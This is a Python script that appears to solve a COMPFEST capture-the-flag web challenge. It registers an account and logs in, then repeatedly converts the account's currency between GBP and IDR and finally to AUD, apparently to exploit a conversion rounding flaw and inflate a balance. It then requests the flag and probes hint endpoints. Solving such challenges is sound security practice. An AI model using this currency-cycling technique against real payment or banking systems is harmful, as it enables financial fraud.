import requests

url = "http://ctf.compfest.id:7303"
session = requests.Session()

# Register with document-inspired credentials
register_data = {
    "username": "1asdasd",
    "password": "1asdasd",
    "confirm_password": "1asdasd",
}
response = session.post(url + "/register", data=register_data)
print("Register:", response.text)

# Login
login_data = {"username": "1asdasd", "password": "1asdasd"}
response = session.post(url + "/login", data=login_data)
print("Login:", response.text)

# Perform currency conversion cycles
for _ in range(4):
    response = session.post(url + "/change-currency", data={"currency": "GBP"})
    print("To GBP:", response.text)
    response = session.post(url + "/change-currency", data={"currency": "IDR"})
    print("To IDR:", response.text)
response = session.post(url + "/change-currency", data={"currency": "AUD"})
print("To AUD:", response.text)

# Check balance and flag
response = session.get(url + "/are-you-rich")
print("Are You Rich:", response.text)

# Test document hints
response = session.get(url + "/monke")
print("Monke Endpoint:", response.text)
response = session.get(url + "/?id=00111010101001011110")
print("Binary ID:", response.text)
